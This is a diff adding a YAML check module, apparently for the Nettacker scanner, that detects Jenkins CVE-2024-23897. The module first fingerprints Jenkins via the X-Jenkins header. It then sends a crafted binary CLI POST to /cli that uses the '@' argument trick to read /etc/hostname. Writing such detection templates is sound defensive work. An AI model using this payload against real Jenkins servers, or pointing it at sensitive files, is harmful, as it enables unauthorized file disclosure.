@@ -1,0 +1,90 @@
+info:
+  name: jenkins_cve_2024_23897_vuln
+  author: Mohamed Solaiman
+  severity: 9.8
+  description: >
+    Jenkins CLI Arbitrary File Read Vulnerability (CVE-2024-23897). The Jenkins CLI
+    command parser uses the args4j library which interprets the '@' character as a
+    file read operator. An attacker can read arbitrary files on the Jenkins controller
+    by sending crafted CLI commands with '@' prefixed arguments. This affects Jenkins
+    versions prior to 2.426.3, 2.442.1, and LTS 2.426.3.
+  reference:
+    - https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314
+    - https://nvd.nist.gov/vuln/detail/CVE-2024-23897
+    - https://www.rapid7.com/blog/post/2024/01/24/etr-cve-2024-23897-arbitrary-file-read-in-jenkins-cli/
+  profiles:
+    - vuln
+    - http
+    - critical_severity
+    - cve
+    - jenkins
+    - file-read
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+                - 8080
+                - 8888
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200|302|403"
+              reverse: false
+            headers:
+              X-Jenkins:
+                regex: \d+\.\d+
+                reverse: false
+          log: "response_dependent['headers']['X-Jenkins']"
+
+      - method: post
+        timeout: 5
+        headers:
+          User-Agent: "{user_agent}"
+          Content-Type: "application/octet-stream"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/cli"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+                - 8080
+                - 8888
+        data: "\x00\x00\x00\x06\x00\x00\x00help\x00\x00\x00\x02@/etc/hostname\x00\x00\x00\x00\x00"
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: "([\w.\-]+|No such file)"
+              reverse: false
